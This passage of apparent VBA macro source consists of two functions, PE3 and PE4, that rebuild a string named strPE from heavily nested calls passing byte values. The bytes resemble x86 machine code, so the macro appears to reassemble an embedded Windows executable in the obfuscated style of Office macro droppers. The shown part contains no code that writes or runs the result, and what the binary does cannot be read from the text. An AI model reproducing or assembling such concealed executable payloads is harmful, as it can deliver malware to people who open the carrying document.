    strPE = A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(strPE, "A"), 0), 139), 29), 144), 2), "A"), 29), 161), 164), 2), "A"), 0), 234), "="), 148), 2), "A"), 0), 212), 211), 19), "["), 137), "U"), 216), 137), "E"), 220), 131), 194), 4), 223), 163), 216), 220), "M"), 128), 220), 13), 24), 214), "@"), 0), 221), 28), 229), "h]"), 220)
    strPE = A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "@"), 0), 255), "V"), 131), 196), 12), 161), 172), 2), "A"), 0), 133), 192), 15), 213), 137), 13), 243), 201), "38"), 131), 207), "x"), 186), 255), 255), 255), 127), 215), 193), 137), "|"), 192), 137), 183), ","), 137), "MO"), 137), "M"), 204), 172), "M"), 224), 137), "M"), 228)
    strPE = B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 137), "M"), 232), ".M"), 236), 137), 10), 176), 137), 211), 180), 137), "}"), 160), 137), "U"), 164), "."), 189), "`"), 255), 255), 255), 137), 149), 166), "i"), 255), 255), 137), "}"), 208), 137), "U"), 23), 137), 141), "p"), 255), 255), 255), 137), 141), ";"), 255), 255), 255), 137), "M")
    strPE = A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(strPE, "@"), 137), 170), 188), 137), 239), "h>"), 255), 255), 137), 141), "l"), 255), 255), 255), 137), "{"), 128), 137), "/["), 137), 141), "x"), 255), "S"), 209), 137), 13), "H5"), 255), 128), 137), "MQ"), 137), "Mz"), 137), 201), 136), "nM"), 140), 137), 193), 247), 137)
    strPE = B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(strPE, "M"), 148), 15), 142), 31), 1), 0), 0), "6"), 13), "]"), 11), "AD"), 137), "E"), 244), 131), 193), 16), "AN"), 252), 139), "y"), 4), 139), "E"), 180), 139), "0;"), 199), "|o"), 127), "VO]"), 176), "r"), 6), "v"), 226), "a"), 137), "}"), 217), 139), "A")
    strPE = A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(strPE, "M"), 139), "Q"), 8), "9f"), 174), "|"), 13), 127), 5), "9U"), 160), "r"), 6), 137), "U"), 160), 137), "E"), 164), "+"), 211), 27), 199), 139), 189), "d"), 130), "I"), 255), 184), 248), "|"), 22), "b"), 8), "9"), 248), "`"), 150), 255), 255), 222), 12), 137), 149), "`"), 205)
    strPE = A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 255), 255), 137), 133), 30), 255), 255), 255), 139), "y"), 252), 23), "Y"), 248), "9}"), 30), "|"), 18), 127), 10), 139), "M"), 208), ";"), 226), 139), "M"), 252), 9), 6), "L]"), 208), 137), "}"), 212), 139), 136), "t+"), 255), 181), ";Y"), 4), 127), "'|"), 15)
    strPE = B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(strPE, "EM"), 252), 139), 157), "p"), 255), 255), 255), 139), 9), ";"), 217), "w"), 22), 139), "M"), 252), 139), 25), 137), 26), "p#"), 255), 177), 139), "Y"), 152), 137), 157), "t"), 255), 255), 27), 235), 26), 139), "M"), 252), 139), "I"), 12), 139), "]"), 188), ";"), 217), 239), " ")
    strPE = A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(strPE, "|"), 13), 139), "M"), 203), 209), "]"), 184), 139), "I"), 8), ";"), 12), "w"), 17), 139), 228), 252), 139), "YC"), 137), "]"), 184), "]4"), 152), 137), "]"), 188), "w"), 3), 216), "M"), 252), "9"), 133), "l"), 255), 255), 255), 127), 22), "|"), 8), "9"), 149), "h"), 255), 255)
    strPE = B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(strPE, 255), "w"), 12), 137), 149), "h"), 140), 240), 219), 137), 133), "l"), 255), 255), 255), "9}"), 132), 127), 24), "|"), 13), 139), "I"), 18), 139), "]"), 180), ";"), 217), 139), "M"), 252), "w"), 205), 139), "Y"), 248), 137), "}"), 132), "h]"), 128), 223), 9), 9), "]qq")
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(strPE, 217), 139), 222), 252), 137), 174), 192), 139), "]"), 196), 139), "I"), 4), 19), 217), 139), "M)"), 137), "]"), 227), 139), 151), 200), 139), "I"), 8), 3), 205), 139), "M"), 252), 137), "]R"), 139), "]"), 130), 139), 177), 12), 19), 217), 139), 137), 224), 3), "F"), 139), "U")
    strPE = A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(strPE, 232), 137), "]"), 204), 139), "]"), 228), 137), 224), 224), 139), "M"), 252), 19), 216), 139), "A"), 8), 137), "]"), 228), 139), "]"), 236), 179), 208), 225), "p"), 244), 137), "U"), 232), 19), 223), 131), 193), "OH"), 137), "]"), 236), 137), "M"), 252), 26), "E"), 244), 15), 133), 132)
    strPE = A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 30), 255), 255), 161), 172), 2), "A"), 0), 153), 139), 218), 139), "Ui"), 139), 248), 139), "E"), 192), "S"), 182), "R"), 187), 232), "&"), 144), 0), 0), 139), "M"), 204), 137), "U"), 252), 139), "U"), 200), 13), "WQR"), 137), "E"), 248), 232), 17), 144), 0), 0), 213)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(strPE, "M"), 224), ".E"), 152), 139), 25), 228), "SWPQ4U"), 156), 149), 252), 143), 0), 0), 137), "U"), 204), 139), "U"), 236), 17), 27), 200), 139), "E"), 232), "SWRP"), 154), 231), 143), 0), 187), 137), 233), 192), 161), 147), 218), 19), 0), 133)
    strPE = A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 192), "aU"), 246), 241), 142), 136), 0), 0), 0), 223), "M"), 152), 139), 13), 200), 11), "A"), 0), 221), "]"), 216), 223), "m"), 252), 141), "P"), 16), 139), 13), 172), 2), "q"), 0), 154), "]"), 224), 223), "m"), 200), 221), "]"), 232), 223), "m"), 192), 221), "]"), 208), 221)
    strPE = A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(strPE, 133), "x"), 255), "Jb"), 221), 197), 168), 221), 165), 136), 221), "Y"), 144), 223), "h"), 8), 221), 9), 216), 131), 192), " I"), 198), 127), 217), 192), 189), 201), 166), 198), 221), 216), 223), 173), 224), "iW"), 224), 216), 233), 217), 224), 216), "@"), 222), 198), "T"), 216)
    strPE = A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(strPE, 217), 201), 216), 175), 220), "e"), 232), ";"), 201), 221), 216), 192), 192), "H"), 201), 222), 205), ";"), 216), 223), "h"), 216), 220), "e"), 240), 217), 192), 216), 132), 222), 194), 221), 216), "u"), 185), 221), "]"), 144), 144), "]"), 136), 221), "]"), 168), 235), 6), "e"), 133), "x"), 255)

    PE3 = strPE
End Function

Private Function PE4() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(strPE, 255), 255), 161), "v"), 2), "A"), 0), "y"), 248), 6), "~"), 201), 141), "P"), 255), 137), "l"), 244), 219), "E"), 158), 177), 249), 217), 250), 221), 157), "x"), 255), 255), "6,"), 20), 199), 191), "x"), 184), 255), 255), "\"), 232), 141), "j"), 240), 133), 157), 194), 255), 255), 0)
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(strPE, 0), "i%"), 131), 248), 1), 158), 216), "~S"), 141), "H"), 255), 137), 189), 244), 219), "E"), 244), 220), "}"), 168), 222), 250), 221), "]"), 168), 235), 14), 199), "E"), 168), 0), 0), 0), 0), 199), 20), 172), 0), 0), 197), 0), 131), 248), 1), "~"), 19), 141), "P")
    strPE = A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 255), 137), "U"), 244), 12), 196), 145), 220), 249), 136), 217), 250), 221), "]"), 136), 235), 239), 199), "E"), 136), 0), "e"), 0), 249), 199), "E"), 140), 0), 0), 0), 0), 131), 248), 1), "~{"), 3), "H"), 255), 137), "M"), 244), 134), "E"), 244), 220), "6"), 202), 217), 250)
    strPE = A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(strPE, 221), "]"), 144), 235), 171), "?E"), 144), 0), 0), 0), 0), 199), "E"), 148), 0), 0), 0), 0), 139), 21), 200), 11), "A"), 0), "h80@"), 0), 13), 156), "PRd"), 21), 15), "q@"), 0), 229), 209), 188), 2), "AU"), 131), ")"), 16), 131)
    strPE = A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 255), 11), "~@"), 139), 213), "%"), 1), 0), 0), 128), "y"), 142), "H"), 131), 200), 248), 204), "!0"), 139), 199), 139), 29), 200), 11), "A"), 172), 161), "+"), 194), "j"), 0), "Z"), 248), 193), "R"), 135), 3), 195), 201), 2), 154), "H0"), 139), "P"), 16), 3), 5)
    strPE = A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(strPE, 139), 151), "4"), 19), "P"), 20), 152), 192), 232), "A"), 142), 223), 0), 137), "E"), 240), 235), 27), 139), 199), 139), 29), 200), 11), 207), 0), 225), "+"), 194), 209), 248), 193), 224), "="), 139), "Lb"), 16), 137), 165), 240), 151), "T"), 24), 206), "h"), 200), 222), "@"), 0)
    strPE = B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(strPE, "j WS"), 137), 240), 139), 255), 21), 161), 193), "@"), 0), 139), "="), 172), 2), "A"), 0), "2"), 196), 16), 131), 255), 1), "~O"), 139), 222), "%"), 1), 0), 201), 128), "@"), 5), "H"), 131), 200), 254), "@tp"), 139), 199), 127), 29), 200), 11), "A")
    strPE = A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 0), "~+"), 194), "j"), 0), 209), 248), 193), 224), 5), 3), 195), "["), 2), 139), "H8"), 139), "P0+"), 202), 139), "P<"), 27), "P4+H"), 16), 27), "P"), 20), 3), "HI"), 19), "P"), 28), "R7"), 232), 186), 141), 0), 0), 137), 241)
    strPE = A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(strPE, 232), 5), "U"), 236), 235), "("), 139), 199), 139), 29), 200), 11), 30), 0), 153), "+8a"), 248), 193), 224), "u"), 3), 195), 139), "H"), 24), 139), "P"), 145), "+x"), 139), 190), 20), 137), "M"), 232), "gH"), 28), 27), 202), 137), "M"), 236), "h"), 192), "1"), 214)
    strPE = A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(strPE, 0), "j "), 8), "S"), 255), "P"), 149), 193), 228), 0), 139), "="), 172), 2), "A"), 242), 131), 196), 16), 131), 255), 1), "~@"), 139), "=%"), 1), 0), 0), 128), "y"), 5), "HW"), 200), 254), "@t0"), 139), 159), 127), 29), 200), 11), "A"), 168), 153)
    strPE = A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "+:j"), 0), 209), 248), 193), 224), 5), 24), 195), "r"), 2), 139), "H}"), 139), "P"), 8), 244), 202), 139), "P*:P"), 12), "RQ"), 232), 212), 141), "h"), 0), 137), 250), 211), 235), "["), 139), 199), ">"), 29), "$"), 11), "A"), 132), "d+"), 194)
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 209), 248), 151), 224), 5), 144), "L"), 24), 237), "*M"), 224), 139), "T"), 24), 12), "h "), 173), 162), 0), "j "), 14), "i4U"), 228), 255), 21), 146), 132), "@"), 0), 161), 224), 133), "A"), 0), 197), 168), 16), 131), "H"), 1), "-"), 149), 139), 200), 129)
    strPE = B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(strPE, 225), 1), 0), 0), 128), "y"), 5), "I"), 131), 201), 254), "At"), 18), 153), 167), 194), "+"), 21), "z"), 11), "A"), 0), "<"), 248), 193), 224), 5), 249), 194), "j"), 0), 200), "b"), 139), 145), "8"), 139), "X"), 21), 139), "P<"), 139), "x"), 28), 3), 203), 19), "d")
    strPE = A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "RQ"), 232), 183), 140), 23), 0), 139), 194), 139), 218), 235), 23), 153), "+"), 194), 139), 219), 161), 200), 11), "A"), 0), 128), 249), 168), 230), 254), 139), 209), 1), 24), 139), "\"), 1), 239), "h8"), 220), 212), 0), "b"), 137), 208), "EQ"), 139), "M"), 180), 131)
    strPE = A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 243), 4), 5), 210), 1), 190), 0), 131), 179), 0), "j"), 196), "h"), 232), 252), 0), 0), 25), "P"), 232), "t"), 140), 22), "q"), 139), "M"), 164), 137), "E"), 20), 175), "f"), 160), "M"), 0), 5), 203), 1), 0), 0), "h"), 232), 3), "@"), 0), 131), 209), 175), 137), 198)
    strPE = B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(strPE, 180), "QP"), 232), "R"), 198), 0), 0), 139), "M"), 252), 137), 184), 160), 6), "E"), 248), "j"), 0), 5), 244), "p"), 0), 0), "h"), 232), 3), 0), 0), 131), 209), 0), 166), 150), 164), "QP"), 232), "0"), 140), 0), 0), 139), "M"), 204), 137), "E"), 248), 139), "E")
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(strPE, 200), "j"), 0), 5), 244), 1), 0), 226), "h"), 232), 3), 250), 0), 131), 209), 0), 137), "U"), 252), 175), "P"), 136), 14), 140), 247), 0), "hM"), 196), 227), "E"), 200), 139), "E"), 192), 189), "^"), 5), 244), 1), 0), 0), "h"), 232), 3), 0), 0), 235), 209), 0)
    strPE = A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(strPE, 215), "U"), 204), "QP"), 232), 236), "W"), 0), 0), 139), "Mo"), 137), "E"), 192), 139), "E"), 152), 177), 0), "T"), 244), 231), "t"), 0), "h"), 232), 3), 0), 0), 131), 209), 0), 165), "U"), 196), "QP"), 232), 202), 139), 0), "B"), 139), "M"), 244), 137), ","), 152)
    strPE = A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(strPE, 139), "E"), 240), "s"), 0), 196), 244), 1), 0), 0), "h"), 232), 3), 0), 138), "8"), 209), 0), 137), "U"), 156), "Q"), 8), 232), 168), 139), 0), 0), 137), 182), 240), 139), 223), 157), 137), "U"), 244), 139), "s"), 236), 5), 244), 1), "+"), 0), 131), 209), 0), "j"), 0)
    strPE = A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "H"), 232), 3), 0), 0), "QP"), 232), 144), 139), 0), 0), 139), "M"), 228), 137), 157), "s"), 139), "E"), 224), 225), 134), 5), 190), 1), 0), 0), "h"), 232), 3), 0), 0), 131), 209), 246), 137), "U"), 236), "QP2n"), 139), "H"), 0), 129), ";"), 244), 1)
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(strPE, 0), 239), 4), 0), 131), 211), 0), "h"), 232), 183), 172), "/SW"), 183), "E"), 224), 137), "U"), 228), 232), 1), 133), "bZ"), 139), 141), "t"), 255), 255), 255), 137), "E"), 216), 139), "!v"), 255), 255), 255), "j"), 0), 5), 31), 191), 0), 0), 10), "+"), 3)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(strPE, 0), 0), "&"), 209), 0), 137), "U"), 212), "Qp"), 232), 129), 34), 0), 0), 139), "M"), 141), 139), 248), 139), "E"), 184), "j)"), 5), 244), 1), 140), 0), "E"), 232), 3), 0), 0), 131), 209), 239), 139), 218), "QP"), 232), 255), 1), 0), 0), 221), 1), 168)
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(strPE, 220), 13), 16), 194), "@"), 0), 137), "E"), 225), 140), " "), 208), "@"), 0), 133), 192), 221), "]"), 168), 221), "E"), 136), 220), 13), 16), 194), "t"), 16), 219), "v"), 188), 221), 205), 136), 250), "E"), 144), 220), 13), 16), 194), 205), 0), "I]"), 144), 221), 133), "x"), 255)
    strPE = B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 29), "/"), 220), 186), 16), 194), "@"), 0), 221), 13), "x"), 255), 255), 255), 15), 132), "d"), 2), 0), 0), "h"), 8), 220), "@"), 0), 255), 214), 139), 23), 244), 139), 17), 211), 188), 162), 230), "SWR"), 139), "U"), 168), 191), 21), "E"), 252), "Q"), 139), "MA")
    strPE = B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(strPE, "R"), 139), "C"), 180), 191), 139), "E"), 253), 245), "RPh"), 216), 219), "@"), 0), 180), 214), 139), 133), "h"), 255), 255), 255), 139), 141), "l"), 255), 255), "e"), 131), 196), "0"), 5), 244), 1), 0), "0"), 131), 209), 0), "j"), 0), "h"), 232), 31), 0), 0), "Q[")
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(strPE, 232), "a"), 138), 0), 0), 139), 232), 236), "R"), 139), "U"), 232), "-"), 139), "E"), 21), "Q"), 139), "M"), 136), "R"), 139), "U"), 204), "P"), 30), "E"), 200), "Q"), 139), 141), "d"), 255), 255), 255), "RP"), 255), 133), "`"), 255), 255), 255), "["), 244), 1), 0), "6j"), 206)
    strPE = B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 131), 209), 238), "h"), 146), "z"), 0), 0), "QP"), 232), 223), 138), 0), 0), "RPh"), 168), 219), 212), 208), 255), 214), 139), "E"), 128), 196), "M"), 132), 131), 196), ","), 9), 244), 1), 0), 0), 131), "y"), 0), "jQh"), 232), "2"), 0), 0), "QP")
    strPE = A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 232), 253), 137), 0), 0), 139), "M!R"), 249), "U"), 224), 134), 139), "E"), 148), "Q"), 139), "M"), 144), "R"), 139), 230), 196), "PQR"), 223), 157), 185), 139), "M"), 212), "P"), 139), "E"), 208), 5), 244), 1), "p"), 0), "j"), 0), 131), 209), 0), "h"), 249), 3)
    strPE = B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(strPE, 0), 0), "Q"), 139), 5), 199), 137), 0), 0), "R"), 233), "-x"), 219), "@"), 0), 255), 214), 139), "M"), 232), 139), "U"), 184), "TE"), 224), "Q"), 139), 239), 216), 157), 139), 149), 166), 255), 202), 255), "P"), 139), 130), "x"), 255), 255), 255), "Q"), 139), "M"), 156), "R")
    strPE = A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(strPE, 187), "U"), 152), "'"), 139), "E"), 164), "S"), 164), "M"), 160), "RPQhH"), 219), "@"), 0), 255), 214), 223), "m"), 248), 223), "m"), 240), 131), 196), "X"), 222), 192), 220), 21), 30), 194), "@"), 0), 223), 224), 246), 196), 5), "z"), 2), 217), 224), 221), "E"), 168)
    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 255), 192), 224), 193), 222), 181), 223), 224), "%"), 229), "AL"), 0), "u"), 0), 221), 216), "H"), 176), 218), "@"), 0), 235), "t"), 220), "]"), 168), "/"), 224), "%"), 0), "p"), 0), 0), "u"), 10), "j"), 24), 218), "@"), 0), 255), 214), 131), 196), 4), 223), "m"), 26), 223)
    strPE = A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(strPE, "m"), 232), 250), 233), 220), 21), "0"), 194), "@"), 0), 143), 224), 246), 132), 5), 158), 2), 217), 224), 221), "E"), 136), 220), 192), 217), 145), 222), 217), 223), 224), "%"), 0), "A"), 230), 25), "u"), 9), "S"), 216), "X"), 136), 215), "@"), 12), 235), 17), "?]"), 136), 223)
    strPE = B(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(strPE, 224), "%"), 0), "A"), 0), 0), "u"), 10), "h"), 181), 216), "@"), 0), "]'"), 131), 196), 4), 223), "m"), 192), 223), "m"), 224), "'"), 233), 220), 21), "0"), 194), "@"), 0), 226), 224), 246), "C"), 130), "z"), 2), 217), 224), 221), "E"), 144), 192), "g"), 217), 193), 222), "3")
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(strPE, 223), 224), "%"), 0), "A"), 0), 0), "u"), 9), 221), 216), "hh"), 216), 31), 0), 235), 29), 220), "]"), 144), 223), 224), "%"), 0), "A_"), 0), "]"), 139), "h1"), 215), "@"), 0), 255), 214), 131), 196), 4), 223), "m"), 152), 223), "m-"), 222), 233), 220), 21)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "0"), 194), 196), 0), 223), 224), 246), 196), 5), "+"), 2), 237), 224), 221), "/x"), 255), 255), 255), 220), 192), 13), "$"), 222), 217), "e"), 224), "%"), 0), "A"), 0), 0), "u"), 17), 22), 193), 215), "!"), 226), 221), 216), 255), 214), 131), 196), "l"), 233), 150), 0), 0)
    strPE = B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(strPE, 0), 220), 157), "x"), 138), 13), 255), 223), 224), "%"), 250), "S"), 0), 0), 152), "m"), 131), 0), 0), 0), "h"), 192), 214), "@"), 0), 255), 214), 131), 196), 4), 235), "wh"), 160), 214), "@"), 0), "."), 214), 132), "U"), 252), 139), "E"), 248), 139), "M"), 180), "SW")
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "R"), 13), "U"), 176), "PQ"), 30), "h|"), 214), "@"), 0), 255), 214), 248), 156), 184), 139), "M"), 188), 20), "U"), 152), "+"), 199), 139), "}"), 248), 27), 203), 162), "]"), 160), "QDM"), 252), "P"), 139), "E"), 156), 29), 215), 16), 135), 164), 27), 193), 139), 231)
    strPE = A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "P"), 139), "E"), 180), "R"), 139), "U"), 145), "+"), 202), 199), 212), 27), 208), "S"), 175), "hX"), 214), "@"), 0), 255), 214), 139), 8), 188), 139), "MG"), 139), "U"), 156), "P"), 139), "]"), 152), "Q"), 196), "PW"), 13), 248), 203), 214), "@"), 0), 255), 214), 131), 196)
    strPE = B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "X"), 161), 28), 208), "-"), 0), 133), 192), 15), 132), 255), 0), 167), 22), "h="), 172), 2), 3), 183), 1), 15), 142), 184), 0), 0), 171), "\"), 244), 144), "@"), 0), 127), 163), 131), 209), 4), "3"), 219), 139), 187), "4"), 208), "@"), 0), 133), 173), 127), 15), "h")
    strPE = B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 224), 204), 29), 0), 255), 18), 131), 192), 4), 233), 135), 0), 0), 0), "j"), 0), 131), 205), "dh"), 232), 3), 0), 0), "|4"), 139), 13), 172), 2), "A"), 0), 130), 200), 11), 177), 0), 193), 225), 5), 139), "T"), 192), 248), 129), 194), "="), 246), 0), "S")
